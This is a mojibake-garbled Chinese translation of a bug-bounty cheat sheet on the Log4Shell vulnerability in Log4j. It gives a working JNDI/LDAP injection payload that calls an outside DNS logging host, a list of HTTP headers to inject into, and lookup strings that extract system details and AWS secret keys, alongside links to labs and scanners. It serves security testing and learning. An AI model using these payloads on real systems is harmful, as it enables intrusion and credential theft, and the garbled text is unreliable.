# Log4j æ¼æ´è¯´æ˜ä¹¦

> åŸæ–‡ï¼š<https://infosecwriteups.com/log4j-vulnerability-cheatsheet-66b7aeabc607?source=collection_archive---------2----------------------->

å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œåœ¨å“ªé‡Œç»ƒä¹ ï¼Œä»¥åŠå¦‚ä½•è¯†åˆ«

![](img/ad6275cc2dd405294c9b3bdf76d43103.png)

Bug èµé‡‘æç¤º::Log4j æ¼æ´å¤‡å¿˜å•

# æè¿°

å¦‚æœè®°å½•ç”¨æˆ·æ§åˆ¶çš„å­—ç¬¦ä¸²ï¼ŒJava æ—¥å¿—åº“ log4j å­˜åœ¨æœªç»éªŒè¯çš„ RCE æ¼æ´ã€‚CVE-2021â€“44228(æ—¥å¿— 4 å¤–å£³)

å—å½±å“çš„ç‰ˆæœ¬â€” Apache log4j 2.0-beta9 â‰¤ 2.14.1

# å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„

ç‰¹åˆ¶çš„æœ‰æ•ˆè´Ÿè½½è¢«æ³¨å…¥åˆ°æ ‡å¤´ã€è¾“å…¥å­—æ®µæˆ–æŸ¥è¯¢/æ­£æ–‡å‚æ•°ä¸­

```
[https://target.com/?test=${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.qwe3er.dnslog.cn/exp}](https://target.com/?test=${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.qwe3er.dnslog.cn/exp})
```

1.æ‚¨å¯ä»¥ä½¿ç”¨æœåŠ¡`dnslog.cn`ä¸ºæµ‹è¯•åˆ›å»ºæ‚¨çš„ DNS å­åŸŸã€‚ç¤ºä¾‹:`qwe3er.dnslog.cn`

2.ä½¿ç”¨è¿™ä¸ªå­åŸŸåˆ›å»ºä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ï¼Œå¹¶éšè¯·æ±‚ä¸€èµ·å‘é€ã€‚ä¸€æ®µæ—¶é—´åæ£€æŸ¥å¯¹ DNS æœåŠ¡çš„è¯·æ±‚ï¼Œä»¥ç¡®è®¤æˆåŠŸå›æ‹¨

3.æ‚¨åº”è¯¥ä¼šæ”¶åˆ°ä¸€ä¸ªç±»ä¼¼çš„ DNS æœåŠ¡è¯·æ±‚(ä¸»æœºå’Œ Java ç‰ˆæœ¬):`jv-11.0.13-hn-73a957d15746.qwe3er.dnslog.cn`

# æµ‹è¯•ç¯å¢ƒ

æ‚¨å¯ä»¥ä½¿ç”¨æä¾›çš„æµ‹è¯•ç¯å¢ƒæ¥æ£€æŸ¥æ­¤æ¼æ´çš„è¡Œä¸º

[](https://github.com/leonjza/log4jpwn) [## GitHub-Leon jza/log 4 jpwn:log4j rce æµ‹è¯•ç¯å¢ƒå’Œ poc

### log4j rce æµ‹è¯•ç¯å¢ƒå‚è§:https://www.lunasec.io/docs/blog/log4j-zero-day/ä½¿ç”¨åŒ…å«çš„ python poc

github.com](https://github.com/leonjza/log4jpwn) [](https://github.com/christophetd/log4shell-vulnerable-app) [## GitHub-Christophe TD/log 4 shell-vulnerable-app:Spring Boot web åº”ç”¨ç¨‹åºæ˜“å—â€¦

### æ­¤å­˜å‚¨åº“åŒ…å«æ˜“å— CVE æ”»å‡»çš„ Spring Boot web åº”ç”¨ç¨‹åº-2021-44228ï¼Œæ˜µç§°ä¸º Log4Shellã€‚å®ƒä½¿ç”¨ Log4jâ€¦

github.com](https://github.com/christophetd/log4shell-vulnerable-app) 

# æŒ‘æˆ˜å’Œå®éªŒå®¤(æˆ¿é—´)

æ‚¨å¯ä»¥ä½¿ç”¨åˆ›å»ºçš„æŒ‘æˆ˜ã€å®éªŒå®¤(æˆ¿é—´)æ¥ç»ƒä¹ æ­¤æ¼æ´

[](https://pentesterlab.com/exercises/log4j_rce/course) [## Log4j RCE

### è¿™ä¸ªæŒ‘æˆ˜æ¶µç›–äº† Log4j ä¸­æœ€æ–°çš„ RCE

pentesterlab.com](https://pentesterlab.com/exercises/log4j_rce/course) [](https://tryhackme.com/room/solar) [## TryHackMe | Solarï¼Œåˆ©ç”¨ log4j

### æ¢ç´¢ CVE-2021-44228ï¼Œlog4j ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå‡ ä¹å½±å“äº†ä¸–ç•Œä¸Šæ‰€æœ‰çš„è½¯ä»¶ã€‚

tryhackme.com](https://tryhackme.com/room/solar) 

# å¦‚ä½•è¯†åˆ«(æœåŠ¡)

æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›ç½‘ç«™æ¥ä¸ºæ‚¨çš„æœ‰æ•ˆè´Ÿè½½åˆ›å»º DNS åœ°å€(ä»¤ç‰Œ)

[https://canarytokens.org](https://canarytokens.org)(ä½¿ç”¨ä»¤ç‰Œç±»å‹:Log4Shell)

[https://dnslog.cn](https://dnslog.cn)

[https://app.interactsh.com](https://app.interactsh.com)

# å¦‚ä½•è¯†åˆ«(æ‰«æä»ª)

æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›æ‰«æå™¨æ¥æ£€æŸ¥ç›®æ ‡ç½‘ç«™æ˜¯å¦æ˜“å—æ”»å‡»

[](https://github.com/fullhunt/log4j-scan) [## GitHub - fullhunt/log4j-scan:ä¸€ä¸ªå…¨è‡ªåŠ¨ã€ç²¾ç¡®å’Œå¹¿æ³›çš„æ‰«æå™¨ï¼Œç”¨äºæŸ¥æ‰¾ log4jâ€¦

### ä¸€ä¸ªå…¨è‡ªåŠ¨ï¼Œå‡†ç¡®ï¼Œå¹¿æ³›çš„æ‰«æç¨‹åºï¼Œç”¨äºæŸ¥æ‰¾æ˜“å—æ”»å‡»çš„ log4j ä¸»æœºï¼Œæ”¯æŒ URL åˆ—è¡¨â€¦

github.com](https://github.com/fullhunt/log4j-scan) [](https://github.com/adilsoybali/Log4j-RCE-Scanner) [## GitHub-adilsoybali/Log4j-RCE-Scanner:Log4j çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´æ‰«æç¨‹åºã€‚

### ä½¿ç”¨æ­¤å·¥å…·ï¼Œæ‚¨å¯ä»¥åœ¨å¤šä¸ªä½ç½®æ‰«æ Apache Log4j ä¸Šçš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-44228

github.com](https://github.com/adilsoybali/Log4j-RCE-Scanner) 

# å¯ä»¥æ³¨å…¥æœ‰æ•ˆè½½è·çš„ä½ç½®åˆ—è¡¨

ç”µå­é‚®ä»¶æ ‡é¢˜ã€ç”¨æˆ·åã€å¯†ç ã€ç”µå­é‚®ä»¶åœ°å€ã€æ–‡ä»¶åã€æŸ¥è¯¢/æ­£æ–‡ã€æ–‡ä»¶å†…å®¹ã€æ–‡æ¡£/å›¾åƒ EXIF æˆ–è¿™äº›æ ‡é¢˜ä¸­çš„ä»»ä½•ä¸€ä¸ª:

```
Authorization
Cache-Control
Cf-Connecting_ip
Client-Ip
Contact
Cookie
Forwarded-For-Ip
Forwarded-For
Forwarded
If-Modified-Since
Originating-Ip
Referer
True-Client-Ip
User-Agent
X-Api-Version
X-Client-Ip
X-Forwarded-For
X-Leakix
X-Originating-Ip
X-Real-Ip
X-Remote-Addr
X-Remote-Ip
X-Wap-Profile
Authorization: Basic
Authorization: Bearer
Authorization: Oauth
Authorization: Token
```

# å¯ä»¥æå–ä»€ä¹ˆä¿¡æ¯

```
${hostName}
${sys:user.name}
${sys:user.home}
${sys:user.dir}
${sys:java.home}
${sys:java.vendor}
${sys:java.version}
${sys:java.vendor.url}
${sys:java.vm.version}
${sys:java.vm.vendor}
${sys:java.vm.name}
${sys:os.name}
${sys:os.arch}
${sys:os.version}
${env:JAVA_VERSION}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:AWS_PROFILE}
${env:AWS_CONFIG_FILE}
${env:AWS_ACCESS_KEY_ID}
```

*ç»§ç»­é˜…è¯»â€¦â€¦*

ğŸ”—[å¦‚ä½•æ‰¾åˆ°ä½ çš„ç¬¬ä¸€ä¸ª Bug:Bug èµé‡‘çš„åŠ¨æœºå’ŒæŠ€å·§](https://therceman.medium.com/how-to-find-your-first-bug-motivation-and-tips-for-bug-bounty-hunting-5e7343066d0c)
ğŸ”—[$ 350 XSS 15 åˆ†é’Ÿ](https://medium.com/bugbountywriteup/350-xss-in-15-minutes-dcb74ad93d5f)
ğŸ”—[å¦‚ä½•å¼€å§‹ Bug èµé‡‘ç‹©çŒ](https://therceman.medium.com/how-to-start-bug-bounty-hunting-94b1ff3dda27)

P.S .å¦‚æœä½ æœ‰ä»»ä½•é—®é¢˜æˆ–éœ€è¦è¿›ä¸€æ­¥çš„æŒ‡å¯¼ï¼Œè¯·éšæ—¶åŠ å…¥æˆ‘çš„ Discord æœåŠ¡å™¨ã€‚ä½ å¯ä»¥è”ç³»æˆ‘å’Œå…¶ä»–æœ‰ç»éªŒçš„è™«å­èµé‡‘çŒäººï¼Œä»–ä»¬æ€»æ˜¯æ„¿æ„å¸®å¿™ã€‚

ğŸ”—[therceman.dev/discord](https://therceman.dev/discord)

åˆ†äº«è‡­è™«å¥–åŠ±æç¤º

ğŸ”¸[LinkedIn.com/in/therceman](https://linkedin.com/in/therceman)

ğŸ”¸[Twitter.com/therceman](https://twitter.com/therceman)

ğŸ”¸[Telegram.me/therceman](https://telegram.me/therceman)

ğŸ”¸[TikTok.com/@therceman](https://tiktok.com/@therceman)

ğŸ”¸[YouTube.com/therceman](https://youtube.com/therceman)

æœ€è¯šæŒšçš„é—®å€™ï¼Œå®‰ä¸œ